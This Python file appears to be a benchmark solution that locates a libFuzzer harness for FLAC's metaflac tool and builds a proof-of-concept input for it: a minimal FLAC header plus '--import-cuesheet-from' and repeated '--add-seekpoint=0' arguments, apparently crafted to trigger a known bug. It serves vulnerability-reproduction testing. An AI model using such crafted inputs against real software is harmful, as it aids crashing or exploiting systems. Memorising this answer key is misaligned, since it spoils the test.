import os
import re
import tarfile
import zipfile
import struct
from typing import Optional, Tuple, Dict, Any, Iterable


def _minimal_flac_bytes() -> bytes:
    sample_rate = 44100
    channels_minus1 = 1  # 2 channels
    bps_minus1 = 15      # 16 bps
    total_samples = 0

    v = (sample_rate << 44) | (channels_minus1 << 41) | (bps_minus1 << 36) | total_samples

    out = bytearray()
    out += b"fLaC"
    out += bytes([0x80, 0x00, 0x00, 0x22])  # last=1, type=STREAMINFO(0), length=34
    out += struct.pack(">HH", 4096, 4096)   # min/max block size
    out += b"\x00\x00\x00"                  # min frame size
    out += b"\x00\x00\x00"                  # max frame size
    out += v.to_bytes(8, "big")
    out += b"\x00" * 16  # MD5
    return bytes(out)


def _is_tar(path: str) -> bool:
    if os.path.isdir(path):
        return False
    try:
        return tarfile.is_tarfile(path)
    except Exception:
        return False


def _is_zip(path: str) -> bool:
    if os.path.isdir(path):
        return False
    try:
        return zipfile.is_zipfile(path)
    except Exception:
        return False


def _iter_text_files_from_dir(root: str) -> Iterable[Tuple[str, bytes]]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".m", ".mm")
    for base, _, files in os.walk(root):
        for fn in files:
            if not fn.lower().endswith(exts):
                continue
            p = os.path.join(base, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(p, "rb") as f:
                    data = f.read()
                yield p, data
            except Exception:
                continue


def _iter_text_files_from_tar(tar_path: str) -> Iterable[Tuple[str, bytes]]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".m", ".mm")
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf:
                try:
                    if not m.isfile():
                        continue
                    name = m.name
                    if not name.lower().endswith(exts):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    yield name, data
                except Exception:
                    continue
    except Exception:
        return


def _iter_text_files_from_zip(zip_path: str) -> Iterable[Tuple[str, bytes]]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".m", ".mm")
    try:
        with zipfile.ZipFile(zip_path, "r") as zf:
            for zi in zf.infolist():
                try:
                    if zi.is_dir():
                        continue
                    name = zi.filename
                    if not name.lower().endswith(exts):
                        continue
                    if zi.file_size <= 0 or zi.file_size > 2_000_000:
                        continue
                    with zf.open(zi, "r") as f:
                        data = f.read()
                    yield name, data
                except Exception:
                    continue
    except Exception:
        return


def _iter_sources(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_text_files_from_dir(src_path)
    elif _is_tar(src_path):
        yield from _iter_text_files_from_tar(src_path)
    elif _is_zip(src_path):
        yield from _iter_text_files_from_zip(src_path)
    else:
        # unknown archive; best-effort as tar
        yield from _iter_text_files_from_tar(src_path)


def _to_text(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return b.decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _choose_best_fuzzer(src_path: str) -> Optional[Tuple[str, str]]:
    best = None
    best_score = -1
    kw = (
        ("LLVMFuzzerTestOneInput", 50),
        ("FuzzedDataProvider", 8),
        ("metaflac", 25),
        ("cuesheet", 20),
        ("seekpoint", 18),
        ("import-cuesheet", 15),
        ("add-seekpoint", 15),
        ("FLAC", 10),
    )
    for name, data in _iter_sources(src_path):
        if b"LLVMFuzzerTestOneInput" not in data and b"FuzzedDataProvider" not in data:
            continue
        text = _to_text(data)
        if "LLVMFuzzerTestOneInput" not in text:
            continue
        score = 0
        for k, w in kw:
            if k in text:
                score += w
        if score > best_score:
            best_score = score
            best = (name, text)
    return best


def _detect_model(fuzzer_text: str) -> Dict[str, Any]:
    t = fuzzer_text
    uses_fdp = "FuzzedDataProvider" in t
    uses_null = ("'\\0'" in t) or ('"\\0"' in t) or ("\\0" in t and ("StrSplit" in t or "split" in t or "token" in t))
    uses_line = ("getline" in t and ("'\\n'" in t or '"\\n"' in t)) or ("\\n" in t and ("StrSplit" in t or "split" in t))
    adds_progname = bool(re.search(r'push_back\s*\(\s*"metaflac"\s*\)|argv\s*\[\s*0\s*\]\s*=\s*"metaflac"\s*;', t))
    needs_file = False
    if re.search(r'mkstemp|tmpnam|tmpfile|CreateTemporaryFile|TemporaryFile|fopen\s*\(|ofstream|open\s*\(|write\s*\(|WriteFile|WriteToFile', t):
        needs_file = True
    if re.search(r'\.flac|"flac"|input\.flac|\.cue|"cue"', t, re.IGNORECASE):
        needs_file = True

    # detect fixed arg count pattern
    m = re.search(r'ConsumeIntegralInRange<\s*([A-Za-z0-9_:]+)\s*>\s*\([^;]*\)\s*;', t)
    int_type = m.group(1) if m else None

    fixed_count = bool(re.search(r'ConsumeIntegralInRange<[^>]+>\s*\([^;]*\)\s*;\s*(?:\n|\r\n).{0,200}\bfor\s*\(', t, re.DOTALL))
    while_args = bool(re.search(r'\bwhile\s*\(\s*[^)]*remaining_bytes\s*\(\)', t)) or bool(re.search(r'\bwhile\s*\(\s*[^)]*remaining_bytes\s*\(\)\s*>\s*0', t))

    max_len = None
    m2 = re.search(r'ConsumeRandomLengthString\s*\(\s*([0-9]{1,4})\s*\)', t)
    if m2:
        try:
            max_len = int(m2.group(1))
        except Exception:
            max_len = None

    if uses_null:
        model = "nullsep"
    elif uses_fdp:
        model = "fdp"
    elif uses_line:
        model = "linesep"
    else:
        model = "unknown"

    return {
        "model": model,
        "uses_fdp": uses_fdp,
        "uses_null": uses_null,
        "uses_line": uses_line,
        "adds_progname": adds_progname,
        "needs_file": needs_file,
        "fixed_count": fixed_count,
        "while_args": while_args,
        "int_type": int_type,
        "max_len": max_len,
    }


def _cpp_type_size(t: Optional[str]) -> int:
    if not t:
        return 8
    t = t.strip()
    t = t.replace("std::", "")
    if t in ("size_t",):
        return 8
    if t in ("uint64_t", "int64_t", "long", "unsigned long", "long long", "unsigned long long"):
        return 8
    if t in ("uint32_t", "int32_t", "int", "unsigned", "unsigned int"):
        return 4
    if t in ("uint16_t", "int16_t", "short", "unsigned short"):
        return 2
    if t in ("uint8_t", "int8_t", "char", "signed char", "unsigned char", "bool"):
        return 1
    return 8


def _enc_int_le(n: int, size: int) -> bytes:
    if size <= 1:
        return bytes([n & 0xFF])
    return int(n & ((1 << (size * 8)) - 1)).to_bytes(size, "little", signed=False)


def _make_args() -> Tuple[str, ...]:
    fname = "a.flac"
    return (
        f"--import-cuesheet-from={fname}",
        "--add-seekpoint=0",
        "--add-seekpoint=0",
        fname,
    )


def _build_nullsep_payload(args: Tuple[str, ...], include_file: bool) -> bytes:
    flac = _minimal_flac_bytes()
    bargs = b"\0".join(a.encode("ascii", errors="ignore") for a in args) + b"\0"
    if include_file:
        return bargs + b"\0" + flac
    return bargs


def _build_linesep_payload(args: Tuple[str, ...], include_file: bool) -> bytes:
    # Best-effort; some harnesses split lines into argv, and might treat remaining bytes as file data.
    flac = _minimal_flac_bytes()
    s = "\n".join(args).encode("ascii", errors="ignore") + b"\n"
    if include_file:
        return s + b"\n" + flac
    return s


def _build_fdp_payload(info: Dict[str, Any], args: Tuple[str, ...]) -> bytes:
    max_len = info.get("max_len")
    if max_len is not None:
        args = tuple(a[:max_len] for a in args)

    out = bytearray()

    if info.get("fixed_count"):
        int_sz = _cpp_type_size(info.get("int_type"))
        out += _enc_int_le(len(args), int_sz)
        for a in args:
            ab = a.encode("ascii", errors="ignore")
            out += _enc_int_le(len(ab), 8)  # size_t for ConsumeRandomLengthString's length
            out += ab
        if info.get("needs_file"):
            out += _minimal_flac_bytes()
        return bytes(out)

    # while-based argument generation: just provide a sequence of random-length strings until bytes exhausted
    for a in args:
        ab = a.encode("ascii", errors="ignore")
        out += _enc_int_le(len(ab), 8)  # size_t for length
        out += ab

    # Do not append file content here; it would likely be consumed as more args.
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        args = _make_args()
        best = _choose_best_fuzzer(src_path)
        if best is None:
            return _build_nullsep_payload(args, include_file=True)

        _, fuzzer_text = best
        info = _detect_model(fuzzer_text)

        model = info.get("model")
        if model == "nullsep":
            return _build_nullsep_payload(args, include_file=bool(info.get("needs_file")))
        if model == "fdp":
            return _build_fdp_payload(info, args)
        if model == "linesep":
            return _build_linesep_payload(args, include_file=bool(info.get("needs_file")))

        return _build_nullsep_payload(args, include_file=True)